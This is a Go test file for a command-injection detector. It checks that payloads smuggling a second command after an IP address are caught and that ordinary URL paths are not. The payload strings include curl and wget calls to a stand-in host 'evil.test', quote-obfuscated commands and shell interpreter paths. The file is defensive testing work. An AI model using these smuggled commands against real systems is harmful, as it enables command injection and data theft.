// Copyright (c) 2026 Gembit Soultan Shirazi <gembit.soultan@gmail.com>. All rights reserved.

package shelli

import "testing"

// TestAbsolutePathInCommandPosition is the regression for a bypass the pentest
// harness found: writing the command's full path walked straight through.
//
// "; id" was blocked and "; /usr/bin/id" was not, because commandWord stops at
// the leading slash and scanPaths only resolves basenames against the
// interpreter list. "/bin/sh" and "/bin/bash" were caught, which is what made it
// look covered; everything that is not a shell was not. "| /usr/bin/curl
// evil.test" reached the backend.
func TestAbsolutePathInCommandPosition(t *testing.T) {
	d := New()
	for _, payload := range []string{
		"1.1.1.1; /usr/bin/id",
		"1.1.1.1 | /usr/bin/curl evil.test",
		"1.1.1.1; /bin/cat /tmp/x",
		"1.1.1.1 && /usr/bin/wget http://evil.test/x",
		"1.1.1.1; /usr/local/bin/python3 -c 'x'",
		"1.1.1.1\n/usr/bin/whoami",
		// Directory traversal in the path does not change what runs.
		"1.1.1.1; /bin/../bin/id",
		// Quoting is removed by the shell before the path resolves.
		`1.1.1.1; /bin/c'a't /tmp/x`,
	} {
		if v := d.Analyze([]byte(payload)); !v.Detected() {
			t.Errorf("missed %q (score %d, signals %v)", payload, v.Score, v.Signals)
		}
	}
}

// TestPathsOutsideCommandPositionStayQuiet is the other half, and the reason the
// resolution lives in command position rather than in scanPaths: a URL path is
// the single most common thing in a request value, and "/api/v1/ping" ends in a
// command name.
func TestPathsOutsideCommandPositionStayQuiet(t *testing.T) {
	d := New()
	for _, benign := range []string{
		"/api/v1/ping",
		"/v2/host/status",
		"https://example.test/docs/echo",
		"/usr/share/doc/id",
		"the file is at /usr/bin/id on most systems",
		"/downloads/2026/at",
		"/help/sleep-tracking",
		"/blog/how-to-use-curl",
		"GET /api/ping HTTP/1.1",
		"/static/js/node.min.js",
	} {
		if v := d.Analyze([]byte(benign)); v.Detected() {
			t.Errorf("false positive on %q (score %d, signals %v)", benign, v.Score, v.Signals)
		}
	}
}

// TestPathCommandWordResolvesTheLastComponent pins the helper directly: the
// shell runs the final component whatever precedes it.
func TestPathCommandWordResolvesTheLastComponent(t *testing.T) {
	for _, tc := range []struct{ in, want string }{
		{"/usr/bin/id", "id"},
		{"/bin/cat", "cat"},
		{"/bin/../bin/id", "id"},
		{`/bin/c'a't`, "cat"},
		{"/usr/bin/id -u", "id"},

		// Not a command name: no path at all, or nothing after the last slash.
		{"id", ""},
		{"/", ""},
		{"/usr/bin/", ""},
		{"", ""},
	} {
		_, got := pathCommandWord([]byte(tc.in), 0)
		if got != tc.want {
			t.Errorf("pathCommandWord(%q) = %q, want %q", tc.in, got, tc.want)
		}
	}
}

// TestURLPathEndingInAnInterpreterNameStaysQuiet is the regression for a false
// positive an embedder hit in production traffic: a redirect parameter holding
// an ordinary dashboard link was refused.
//
// SignalInterpreterPath asked only whether the "/name" was preceded by a
// non-space byte, and called that "a path component". Any URL with two or more
// components ending in an interpreter name therefore satisfied it, so
// "/api/v1/dash" and "https://app.example.com/dash" both scored 5 and blocked on
// their own, while "/dash" alone did not — the false positive appeared when the
// route got a prefix.
//
// "dash" is the Debian Almquist shell, so the name really is an interpreter; the
// mistake was reading "preceded by anything" as evidence that the value names an
// executable. What makes /bin/sh an executable is the directory, and no web
// route serves its content out of /bin.
func TestURLPathEndingInAnInterpreterNameStaysQuiet(t *testing.T) {
	d := New()
	for _, benign := range []string{
		// The reported case, in both the forms an embedder sees it.
		"/api/v1/dash",
		"https://app.example.com/dash",
		"https://app.example.com/sh",
		"/admin/sh",
		"/app/zsh",
		"/reports/2026/dash",
		// A dashboard link under a prefix is the shape that started this.
		"/tenant/acme/dash",
		"next=/console/dash",
		// Words that merely begin with an interpreter name were already fine and
		// must stay that way.
		"https://app.example.com/dashboard",
		"/api/v1/dashboard",
		"/docs/shell-scripting",
	} {
		if v := d.Analyze([]byte(benign)); v.Detected() {
			t.Errorf("false positive on %q (score %d, signals %v)", benign, v.Score, v.Signals)
		}
	}
}

// TestInterpreterPathInABinaryDirectoryStillFires is the other half: narrowing
// the signal must not cost the detection it exists for.
//
// A value naming /bin/sh is not describing a file, and it carries no separator
// and nothing in command position, so this signal is the only one that sees it.
func TestInterpreterPathInABinaryDirectoryStillFires(t *testing.T) {
	d := New()
	for _, payload := range []string{
		"/bin/sh",
		"/bin/bash",
		"/usr/bin/sh",
		"/usr/bin/python",
		"/usr/local/bin/bash",
		"/sbin/sh",
		"/usr/sbin/sh",
		"cmd=/bin/sh",
		"shell=/usr/bin/zsh",
		// Traversal inside the path does not change which directory it resolves in.
		"/usr/../bin/sh",
	} {
		if v := d.Analyze([]byte(payload)); !v.Detected() {
			t.Errorf("missed %q (score %d, signals %v)", payload, v.Score, v.Signals)
		}
	}
}
